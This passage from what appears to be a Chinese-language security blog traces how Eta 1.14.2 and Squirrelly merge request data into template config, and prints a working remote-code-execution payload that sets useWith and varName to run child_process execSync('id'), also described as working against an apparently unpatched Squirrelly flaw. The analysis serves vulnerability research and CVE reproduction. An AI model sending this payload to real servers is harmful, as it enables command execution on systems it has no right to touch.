class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Echo Server<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- /echo.zip --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;/&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;text&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;echo&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// echo.eta</span></span><br><span class=\"line\">&lt;%=it.<span class=\"property\">text</span> %&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>上面是其他檔案的內容</li>\n<li>在 <code>node_modules/eta/dist/eta.umd.js</code> 裡面的 <code>renderFile</code> function 是 <code>res.render</code> 會呼叫到的 function</li>\n<li>追一下 function 的呼叫</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">renderFile(filename, data, config, cb)</span><br><span class=\"line\">-&gt; tryHandleCache(data, renderConfig, callback)</span><br><span class=\"line\">   -&gt; handleCache$1(options)</span><br><span class=\"line\">      -&gt; loadFile(filePath, options, noCache)</span><br><span class=\"line\">         -&gt; compile(str, config)</span><br><span class=\"line\">            -&gt; compileToString(str, config)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>主要是 <code>compileToString</code> 在處理拼接的字串</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">compileToString</span>(<span class=\"params\">str, config</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> buffer = <span class=\"title function_\">parse</span>(str, config);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> res = <span class=\"string\">&quot;var tR=&#x27;&#x27;,__l,__lP&quot;</span> + (config.<span class=\"property\">include</span> ? <span class=\"string\">&quot;,include=E.include.bind(E)&quot;</span> : <span class=\"string\">&quot;&quot;</span>) + (config.<span class=\"property\">includeFile</span> ? <span class=\"string\">&quot;,includeFile=E.includeFile.bind(E)&quot;</span> : <span class=\"string\">&quot;&quot;</span>) + <span class=\"string\">&quot;\\nfunction layout(p,d)&#123;__l=p;__lP=d&#125;\\n&quot;</span> + (config.<span class=\"property\">useWith</span> ? <span class=\"string\">&quot;with(&quot;</span> + config.<span class=\"property\">varName</span> + <span class=\"string\">&quot;||&#123;&#125;)&#123;&quot;</span> : <span class=\"string\">&quot;&quot;</span>) + <span class=\"title function_\">compileScope</span>(buffer, config) + (config.<span class=\"property\">includeFile</span> ? <span class=\"string\">&quot;if(__l)tR=&quot;</span> + (config.<span class=\"property\">async</span> ? <span class=\"string\">&quot;await &quot;</span> : <span class=\"string\">&quot;&quot;</span>) + <span class=\"string\">`includeFile(__l,Object.assign(<span class=\"subst\">$&#123;config.varName&#125;</span>,&#123;body:tR&#125;,__lP))\\n`</span> : config.<span class=\"property\">include</span> ? <span class=\"string\">&quot;if(__l)tR=&quot;</span> + (config.<span class=\"property\">async</span> ? <span class=\"string\">&quot;await &quot;</span> : <span class=\"string\">&quot;&quot;</span>) + <span class=\"string\">`include(__l,Object.assign(<span class=\"subst\">$&#123;config.varName&#125;</span>,&#123;body:tR&#125;,__lP))\\n`</span> : <span class=\"string\">&quot;&quot;</span>) + <span class=\"string\">&quot;if(cb)&#123;cb(null,tR)&#125; return tR&quot;</span> + (config.<span class=\"property\">useWith</span> ? <span class=\"string\">&quot;&#125;&quot;</span> : <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (config.<span class=\"property\">plugins</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; config.<span class=\"property\">plugins</span>.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">const</span> plugin = config.<span class=\"property\">plugins</span>[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (plugin.<span class=\"property\">processFnString</span>) &#123;</span><br><span class=\"line\">                res = plugin.<span class=\"title function_\">processFnString</span>(res, config);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>看起來只要可以污染 <code>config</code> 就可以達到我們要的效果</li>\n<li>分析了 <code>2.0.1</code> 版本之後可以發現他把 <code>renderConfig</code> 跟 <code>data</code> 拆開了，也就是說是無法影響 config 的內容的</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Version 2.0.0</span><br><span class=\"line\">This commit includes fixes for several security vulnerabilities. Specifically, in version 1, Eta merged the data parameter of renderFile() into config -- meaning that malicious untrusted user data, passed through in a very specific way, could potentially modify the values of varName, include, includeFile, and useWith, and thus insert arbitrary code into user template functions.</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 Version 2.0.0 的說明表明把這個漏洞修掉了</li>\n<li>接下來分析的是 <code>1.14.2</code> 版本</li>\n</ul>\n<h3 id=\"version-1.14.2\">Version 1.14.2<a title=\"#version-1.14.2\" href=\"#version-1.14.2\"></a></h3>\n<ul>\n<li>一樣找到 <code>renderFile</code> 看看後續呼叫了什麼 functions，跟上面的呼叫順序是一樣的</li>\n<li>唯一比較不一樣的地方是在 <code>renderFile</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> viewOpts = data.<span class=\"property\">settings</span>[<span class=\"string\">&quot;view options&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (viewOpts) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">copyProps</span>(renderConfig, viewOpts);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>感覺上很熟悉，好像看過，沒錯！跟分析 ejs 的時候有一樣的東西，可以在 data 裡面的 <code>view options</code> 可以影響 <code>renderConfig</code> 的內容</li>\n<li>因此看到 <code>config</code> 的內容</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  async<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  autoEscape<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  autoTrim<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span> &#x27;nl&#x27; <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  cache<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  e<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> XMLEscape<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  include<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> includeHelper<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  parse<span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span> exec<span class=\"punctuation\">:</span> &#x27;&#x27;<span class=\"punctuation\">,</span> interpolate<span class=\"punctuation\">:</span> &#x27;=&#x27;<span class=\"punctuation\">,</span> raw<span class=\"punctuation\">:</span> &#x27;~&#x27; <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  plugins<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  rmWhitespace<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  tags<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span> &#x27;&lt;%&#x27;<span class=\"punctuation\">,</span> &#x27;%&gt;&#x27; <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  templates<span class=\"punctuation\">:</span> Cacher <span class=\"punctuation\">&#123;</span> cache<span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span> <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  useWith<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  varName<span class=\"punctuation\">:</span> &#x27;it&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">  includeFile<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> includeFileHelper<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  filepathCache<span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  settings<span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    &#x27;x-powered-by&#x27;<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    etag<span class=\"punctuation\">:</span> &#x27;weak&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;etag fn&#x27;<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> generateETag<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    env<span class=\"punctuation\">:</span> &#x27;development&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;query parser&#x27;<span class=\"punctuation\">:</span> &#x27;extended&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;query parser fn&#x27;<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> parseExtendedQueryString<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;subdomain offset&#x27;<span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;trust proxy&#x27;<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;trust proxy fn&#x27;<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> trustNone<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    view<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Function<span class=\"punctuation\">:</span> View<span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    views<span class=\"punctuation\">:</span> &#x27;/usr/src/app/views&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">    &#x27;jsonp callback name&#x27;<span class=\"punctuation\">:</span> &#x27;callback&#x27;</span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  text<span class=\"punctuation\">:</span> &#x27;<span class=\"number\">1</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">  _locals<span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span>Object<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">null</span></span> prototype<span class=\"punctuation\">]</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  views<span class=\"punctuation\">:</span> &#x27;/usr/src/app/views&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">  filename<span class=\"punctuation\">:</span> &#x27;/usr/src/app/views/echo.eta&#x27;</span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>參數與 <code>config</code> 裡面的設定是混在一起的，我們可以透過 <code>copyProps</code> 加上惡意的 <code>config</code></li>\n<li>正常組出來的樣子會長長下面的樣子</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tR=<span class=\"string\">&#x27;&#x27;</span>,__l,__lP,include=E.<span class=\"property\">include</span>.<span class=\"title function_\">bind</span>(E),includeFile=E.<span class=\"property\">includeFile</span>.<span class=\"title function_\">bind</span>(E)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">layout</span>(<span class=\"params\">p,d</span>)&#123;__l=p;__lP=d&#125;</span><br><span class=\"line\">tR+=E.<span class=\"title function_\">e</span>(it.<span class=\"property\">text</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(__l)tR=<span class=\"title function_\">includeFile</span>(__l,<span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(it,&#123;<span class=\"attr\">body</span>:tR&#125;,__lP))</span><br><span class=\"line\"><span class=\"keyword\">if</span>(cb)&#123;<span class=\"title function_\">cb</span>(<span class=\"literal\">null</span>,tR)&#125; <span class=\"keyword\">return</span> tR</span><br></pre></td></tr></table></figure>\n<ul>\n<li>構造出惡意的 <code>config</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][useWith]=true&amp;settings[view options][varName]=it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tR=<span class=\"string\">&#x27;&#x27;</span>,__l,__lP,include=E.<span class=\"property\">include</span>.<span class=\"title function_\">bind</span>(E),includeFile=E.<span class=\"property\">includeFile</span>.<span class=\"title function_\">bind</span>(E)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">layout</span>(<span class=\"params\">p,d</span>)&#123;__l=p;__lP=d&#125;</span><br><span class=\"line\"><span class=\"title function_\">with</span>(<span class=\"params\">it=&#123;<span class=\"string\">&quot;text&quot;</span>: (<span class=\"variable language_\">global</span>.process.mainModule.constructor._load(<span class=\"string\">&#x27;child_process&#x27;</span>).execSync(<span class=\"string\">&#x27;id&#x27;</span>).toString())&#125;||&#123;&#125;</span>)&#123;tR+=E.<span class=\"title function_\">e</span>(it.<span class=\"property\">text</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(__l)tR=<span class=\"title function_\">includeFile</span>(__l,<span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(it=&#123;<span class=\"string\">&quot;text&quot;</span>: (<span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(<span class=\"string\">&#x27;child_process&#x27;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&#x27;id&#x27;</span>).<span class=\"title function_\">toString</span>())&#125;,&#123;<span class=\"attr\">body</span>:tR&#125;,__lP))</span><br><span class=\"line\"><span class=\"keyword\">if</span>(cb)&#123;<span class=\"title function_\">cb</span>(<span class=\"literal\">null</span>,tR)&#125; <span class=\"keyword\">return</span> tR&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到組出來的程式碼，因為 <code>echo.eta</code> 裡面是吃 <code>it.text</code> 所以我把 <code>it</code> 的定義改成上面的樣子他就可以回顯出我要的東西了</li>\n</ul>\n<h2 id=\"squirrelly\">Squirrelly<a title=\"#squirrelly\" href=\"#squirrelly\"></a></h2>\n<ul>\n<li>當時在 AIS3 的時候只有復現出 <code>CVE-2021-32819</code> 不過後續自己在分析的時候有找到沒有記錄在案的漏洞</li>\n<li>不過我看作者好像也沒有要修的意思（？</li>\n<li>下面我分析的是自己找到的部分而不是 <code>CVE-2021-32819</code>，不過思路上都差不多</li>\n<li>下面是 functions 呼叫的順序</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">renderFile(filename, data, cb)</span><br><span class=\"line\">-&gt; tryHandleCache(Config, data, cb)</span><br><span class=\"line\">   -&gt; handleCache(options)(data, options)</span><br><span class=\"line\">      -&gt; compile(str, env)</span><br><span class=\"line\">         -&gt; compileToString(str, env)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 <code>renderFile</code> 裡面可以看到他有把 <code>data</code> 中 <code>settings['view options']</code> 傳給 <code>Config</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> viewOpts = data.<span class=\"property\">settings</span>[<span class=\"string\">&#x27;view options&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (viewOpts) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">copyProps</span>(<span class=\"title class_\">Config</span>, viewOpts);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>compileToString</code> 如下</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">compileToString</span>(<span class=\"params\">str, env</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> buffer = <span class=\"title function_\">parse</span>(str, env);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> res = <span class=\"string\">&quot;var tR=&#x27;&#x27;;&quot;</span> +</span><br><span class=\"line\">        (env.<span class=\"property\">useWith</span> ? <span class=\"string\">&#x27;with(&#x27;</span> + env.<span class=\"property\">varName</span> + <span class=\"string\">&#x27;||&#123;&#125;)&#123;&#x27;</span> : <span class=\"string\">&#x27;&#x27;</span>) +</span><br><span class=\"line\">        <span class=\"title function_\">compileScope</span>(buffer, env) +</span><br><span class=\"line\">        <span class=\"string\">&#x27;if(cb)&#123;cb(null,tR)&#125; return tR&#x27;</span> +</span><br><span class=\"line\">        (env.<span class=\"property\">useWith</span> ? <span class=\"string\">&#x27;&#125;&#x27;</span> : <span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (env.<span class=\"property\">plugins</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; env.<span class=\"property\">plugins</span>.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> plugin = env.<span class=\"property\">plugins</span>[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (plugin.<span class=\"property\">processFnString</span>) &#123;</span><br><span class=\"line\">                res = plugin.<span class=\"title function_\">processFnString</span>(res, env);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> is `return cb()` necessary, or could we just do `cb()`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>有沒有發現一個現象，他跟 eta 長得超像的～所以我直接用了上面 eta 的 payload 就可以了</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][useWith]=true&amp;settings[view options][varName]=it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>至於 <code>CVE-2021-32819</code> 是在 <code>defaultFilter</code> 上面做手腳，其實都差不多這邊就不多做分析了</li>\n</ul>\n","next":{"title":"CVE-2021-3129","link":"2023/03/01/CVE-2021-3129"},"plink":"https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs/","toc":[{"id":"ejs-template","title":"EJS template","index":"1","children":[{"id":"code-review","title":"Code review","index":"1.1"},{"id":"踩坑","title":"踩坑","index":"1.2"}]},{"id":"eta-template","title":"ETA template","index":"2","children":[{"id":"code-review-1","title":"Code review","index":"2.1"},{"id":"version-1.14.2","title":"Version 1.14.2","index":"2.2"}]},{"id":"squirrelly","title":"Squirrelly","index":"3"}],"reading_time":"3326 words in 22 min"}